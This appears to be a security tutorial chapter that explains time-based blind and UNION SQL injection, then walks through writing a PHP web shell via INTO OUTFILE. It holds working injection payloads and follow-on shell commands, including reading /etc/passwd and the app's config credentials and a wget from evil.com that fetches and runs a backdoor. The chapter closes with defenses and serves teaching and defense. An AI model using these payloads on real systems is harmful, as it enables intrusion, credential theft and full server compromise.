# 35 - Advanced SQL Injection: Time-Based Blind, UNION, and File Operations

## Time-Based Blind SQL Injection

When the page gives no visible difference between true and false conditions (no error, no content change), the attacker can use **time delays** to infer results.

### MySQL BENCHMARK Function

```sql
BENCHMARK(count, expr)
```

Executes `expr` repeatedly `count` times. The result is always 0, but the **execution time** reveals information.

```
mysql> SELECT BENCHMARK(1000000, ENCODE('hello', 'goodbye'));
+----------------------------------------------+
| BENCHMARK(1000000, ENCODE('hello', 'goodbye')) |
+----------------------------------------------+
|                                              0 |
+----------------------------------------------+
1 row in set (4.74 sec)
```

1 million iterations of `ENCODE()` took 4.74 seconds. The attacker can use this as a controllable delay.

### Time-Based Data Extraction

```sql
1170 UNION SELECT IF(
  SUBSTRING(current,1,1) = CHAR(119),
  BENCHMARK(5000000, ENCODE('MSG', 'by 5 seconds')),
  null
) FROM (Select Database() as current) as tbl;
```

**How it works:**

| Component | Purpose |
|-----------|---------|
| `SUBSTRING(current,1,1)` | Get the first character of the current database name |
| `= CHAR(119)` | Test if it equals `'w'` (ASCII 119) |
| `IF(condition, true_branch, false_branch)` | Conditional execution |
| `BENCHMARK(5000000, ...)` | If true: delay ~5 seconds |
| `null` | If false: return immediately |

**The attacker observes:**
- Response takes ~5 seconds → first character is `'w'` (true, BENCHMARK executed)
- Response is instant → first character is not `'w'` (false, null returned)

By iterating through characters and positions, the attacker extracts the database name, table names, column names, and data — all from response timing alone.

### Time-Based Functions by Database

| Database | Delay Function |
|----------|---------------|
| MySQL | `BENCHMARK(N, expr)`, `SLEEP(seconds)` |
| PostgreSQL | `pg_sleep(seconds)` |
| SQL Server | `WAITFOR DELAY '0:0:5'` |
| Oracle | `DBMS_LOCK.SLEEP(seconds)` (requires privileges) |

## UNION-Based Data Extraction via File Write

### Dumping Schema to a File

```sql
1170 Union All SELECT table_name, table_type, engine
FROM information_schema.tables
WHERE table_schema = 'mysql'
ORDER BY table_name DESC
INTO OUTFILE '/path/location/on/server/www/schema.txt'
```

**What this does:**
1. `UNION` appends a second query's results to the original
2. Reads table names from `information_schema.tables` (MySQL's metadata catalog)
3. `INTO OUTFILE` writes the results to a file on the **server's filesystem**
4. The attacker then accesses `http://target.com/schema.txt` via the web server

**Requirements:**
- MySQL `FILE` privilege (often granted to the db user)
- The target directory must be writable by the MySQL process
- The file must not already exist

### Writing a Web Shell — Full Breakdown

```sql
1170 UNION SELECT "<?system($_REQUEST['cmd']);?>",2,3,4
INTO OUTFILE "/var/www/html/temp/c.php" --
```

#### What the Original Query Looks Like

Assume the application runs:

```sql
SELECT title, description, body, author FROM articles WHERE id = $id
```

The attacker injects after `id=`:

```sql
SELECT title, description, body, author FROM articles WHERE id = 1170
UNION
SELECT "<?system($_REQUEST['cmd']);?>",2,3,4
INTO OUTFILE "/var/www/html/temp/c.php" --
```

#### Breaking Down Each Part

**`1170`** — A valid article ID. The first SELECT returns a normal row. (Could also be an invalid ID — doesn't matter, the UNION result is what the attacker cares about.)

**`UNION SELECT`** — Appends a second result set to the first query's output. UNION requires both SELECTs to have the **same number of columns**. The original query selects 4 columns (`title, description, body, author`), so the injected SELECT must also have 4 values.

**`"<?system($_REQUEST['cmd']);?>"`** — The first column value. This is a string containing **PHP code**. It's not executed by MySQL — MySQL treats it as plain text. It only becomes dangerous when saved as a `.php` file and served by the web server.

**`,2,3,4`** — Placeholder values for columns 2, 3, and 4. These are just dummy integers to satisfy the column count requirement. They'll be written to the file too but are harmless.

**`INTO OUTFILE "/var/www/html/temp/c.php"`** — Instead of returning the query results to the application, MySQL writes them to this file on the server's filesystem. `/var/www/html/` is the typical web root for Apache — any file here is accessible via HTTP.

**`--`** — SQL comment. Everything after this is ignored, including the trailing `'` or other syntax from the original query.

#### What Gets Written to the File

The file `/var/www/html/temp/c.php` now contains something like:

```
<?system($_REQUEST['cmd']);?>    2    3    4
```

(Columns are separated by tabs, with a newline at the end — MySQL's default OUTFILE format.)

#### How the Web Shell Executes

When the attacker visits:

```
http://target.com/temp/c.php?cmd=whoami
```

The execution chain is:

```
Browser request
  → Apache receives GET /temp/c.php?cmd=whoami
    → Apache sees .php extension, passes to PHP interpreter
      → PHP parses the file, finds <? ... ?>
        → system($_REQUEST['cmd']) executes
          → $_REQUEST['cmd'] = "whoami" (from URL parameter)
            → system("whoami") runs on the OS
              → Returns "www-data" (or whatever user Apache runs as)
                → Output sent back to the attacker's browser
```

**`system()`** — PHP function that executes a shell command on the operating system and outputs the result.

**`$_REQUEST['cmd']`** — PHP superglobal that reads the `cmd` parameter from GET, POST, or cookies. The attacker controls this value entirely.

#### What the Attacker Can Do Next

```
c.php?cmd=whoami                    → identify the user
c.php?cmd=cat /etc/passwd           → read system files
c.php?cmd=ls -la /                  → enumerate filesystem
c.php?cmd=cat /var/www/config.php   → steal database credentials
c.php?cmd=wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd
                                    → download and run a persistent backdoor
```

At this point, the attacker has gone from a SQL injection vulnerability to **full remote code execution**. The web application's database credentials, other users' data, and potentially the entire server are compromised.

#### Requirements for This Attack

| Requirement | Why |
|-------------|-----|
| MySQL `FILE` privilege | `INTO OUTFILE` requires this privilege |
| Writable web directory | MySQL process must have write permission to the web root |
| File doesn't exist | `INTO OUTFILE` refuses to overwrite existing files |
| PHP (or similar) on server | The written file must be interpreted as code, not served as plain text |
| Known web root path | Attacker must guess or discover `/var/www/html/` or equivalent |

**This is the most dangerous SQL injection payload.** It turns a data-layer vulnerability into full server compromise in a single request.

**The escalation chain:**

```
SQL Injection
  → INTO OUTFILE writes PHP file to web root
    → PHP file accepts commands via URL parameter
      → Attacker has remote code execution (RCE)
        → Full server compromise
```

### Why UNION Works for This

The `UNION` keyword combines the results of two SELECT statements. The attacker's injected SELECT provides the file content (the PHP code), and `INTO OUTFILE` redirects the output to a file instead of the HTTP response.

The `2,3,4` are placeholder values to match the number of columns in the original query — `UNION` requires both SELECTs to have the same column count.

## Defenses

| Defense | What it prevents |
|---------|-----------------|
| **Parameterized queries (prepared statements)** | All SQL injection — input is never part of the SQL syntax |
| **Least privilege** — revoke `FILE` privilege | `INTO OUTFILE` / `LOAD_FILE()` file operations |
| **Disable `information_schema` access** | Schema enumeration |
| **WAF / query time limits** | Slows BENCHMARK/SLEEP abuse (not a fix) |
| **Read-only database user for web app** | Prevents DROP, INSERT, UPDATE, and file writes |
